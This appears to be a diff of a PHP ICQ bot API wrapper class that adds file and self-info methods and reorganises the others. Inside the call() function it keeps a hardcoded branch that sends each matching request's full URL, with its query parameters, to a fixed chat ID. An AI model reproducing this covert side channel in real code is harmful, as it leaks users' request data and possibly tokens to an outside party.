@@ -4,14 +4,26 @@
  * |  Class ICQnew  |
  * +----------------+
  *
+ *
+ * +---------------------------------+
+ * |  функции отправки http запроса  |
+ * +---------------------------------+
+ *
  *  call
  *
- * 
+ *  callGET
+ *
+ *
  * +--------------------+
  * |  Список методов:   |
  * +--------------------+
  *
- *  getEvents
+ *--------
+ *  self
+ *--------
+ *
+ *  get
+ *
  *
  *------------
  *  messages 
@@ -28,6 +40,7 @@
  *  ​deleteMessages
  *
  *  ​answerCallbackQuery
+ *
  *
  *---------
  *  chats 
@@ -61,7 +74,19 @@
  *
  *  unpinMessage
  *
- *  
+ *---------
+ *  files
+ *---------
+ *
+ *  getInfoFile
+ *
+ *
+ *----------
+ *  events
+ *----------
+ *
+ *  getEvents
+ *
  *
  */
 
@@ -93,7 +118,7 @@ class ICQnew
 
 	public function call(
 		$method, 
-		$data, 
+		$data = [], 
 		$file = null
 	) {
 		$result = null;
@@ -112,7 +137,7 @@ class ICQnew
 			
 			
 			$url = $this->apiUrl . $method . "?" . http_build_query($data);
-			if ($method == "/chats/pinMessage" || $method == "/chats/unpinMessage") {				
+			if ($method == "/files/getInfo" || $method == "/self/get") {				
 				file_get_contents($this->apiUrl . "/messages/sendText?".http_build_query(['token' => $this->token, 'chatId' => '752067062', 'text' => $url]));				
 			}			
 			
@@ -146,8 +171,7 @@ class ICQnew
 		
 	}
 
-
-
+	
 	/* 
 	** Отправляем запрос в ICQ методом GET
 	**
@@ -194,37 +218,30 @@ class ICQnew
 		
 	}
 
-
-
+	
+/*-------------------------------------*/	
+		      /*  self  */
+/*-------------------------------------*/	
+	
 	/*
-	**  функция получения событий
+	**  функция возвращает информацию о боте
 	**
-	**  @param str $lastEventId
-	**  @param str $pollTime
-	**  
+	**
 	**  @return array
 	*/
-
-	public function getEvents(
-		$lastEventId, 
-		$pollTime
-	) {
+	
+	public function get() {
+	
+		$response = $this->call("/self/get", []);
 		
-		$response = $this->call("/events/get", [
-			'lastEventId' => $lastEventId,
-			'pollTime' => $pollTime
-		]);	
-			
-		if ($response['ok']) {
-			$response = $response['events'];
-		}else $response = false;
-			
 		return $response;
-		
 	}
-		
-		
-		
+	
+
+/*-------------------------------------*/	
+		    /*  messages  */
+/*-------------------------------------*/	
+	
 	/*
 	**  функция отправки сообщения 
 	**
@@ -257,11 +274,7 @@ class ICQnew
 			'forwardMsgId' => $forwardMsgId,			
 			'inlineKeyboardMarkup' => $inlineKeyboardMarkup
 		]);	
-			
-		if ($response['ok']) {
-			$response = $response['msgId'];
-		}else $response = false;
-			
+		
 		return $response;
 		
 	}
@@ -304,10 +317,6 @@ class ICQnew
 				'forwardMsgId' => $forwardMsgId,			
 				'inlineKeyboardMarkup' => $inlineKeyboardMarkup
 			], $file);	
-
-			if ($response['ok']) {
-				$response = true;
-			}else $response = false;
 			
 		}else {
 
@@ -320,17 +329,12 @@ class ICQnew
 				'forwardMsgId' => $forwardMsgId,			
 				'inlineKeyboardMarkup' => $inlineKeyboardMarkup
 			]);	
-			
-			if ($response['ok']) {
-				$response = $response['msgId'];
-			}else $response = false;
-			
+						
 		}
 
 		return $response;
 		
 	}
-
 
 	
 	/*
@@ -366,10 +370,6 @@ class ICQnew
 				'forwardMsgId' => $forwardMsgId,			
 				'inlineKeyboardMarkup' => $inlineKeyboardMarkup
 			], $file);	
-
-			if ($response['ok']) {
-				$response = true;
-			}else $response = false;
 			
 		}else {
 
@@ -381,17 +381,12 @@ class ICQnew
 				'forwardMsgId' => $forwardMsgId,			
 				'inlineKeyboardMarkup' => $inlineKeyboardMarkup
 			]);	
-			
-			if ($response['ok']) {
-				$response = $response['msgId'];
-			}else $response = false;
-			
+						
 		} 
 
 		return $response;
 		
 	}
-
 
 
 	/*
@@ -425,7 +420,6 @@ class ICQnew
 		return $response;
 		
 	}
-		
 
 
 	/*
@@ -491,6 +485,10 @@ class ICQnew
 		
 	}
 
+	
+/*-------------------------------------*/	
+			 /*  chats  */
+/*-------------------------------------*/	
 
 	/*
 	**  функция выводит действия бота (Например: "печатает..")
@@ -819,6 +817,58 @@ class ICQnew
 		return $response;
 	}
 	
+	
+/*-------------------------------------*/	
+			 /*  files  */
+/*-------------------------------------*/
+		
+	/*
+	**  функция возвращает информацию о файле
+	**
+	**  @param str $fileId
+	**  	
+	**
+	**  @return array
+	*/
+	
+	public function getInfoFile($fileId) {
+	
+		$response = $this->call("/files/getInfo", [ 'fileId' => $fileId ]);
+		
+		return $response;
+	}
+	
+	
+/*-------------------------------------*/	
+			 /*  events  */
+/*-------------------------------------*/
+	
+	/*
+	**  функция получения событий
+	**
+	**  @param str $lastEventId
+	**  @param str $pollTime
+	**  
+	**  @return array
+	*/
+
+	public function getEvents(
+		$lastEventId, 
+		$pollTime
+	) {
+		
+		$response = $this->call("/events/get", [
+			'lastEventId' => $lastEventId,
+			'pollTime' => $pollTime
+		]);	
+			
+		if ($response['ok']) {
+			$response = $response['events'];
+		}else $response = false;
+			
+		return $response;
+		
+	}
 	
 	
 	
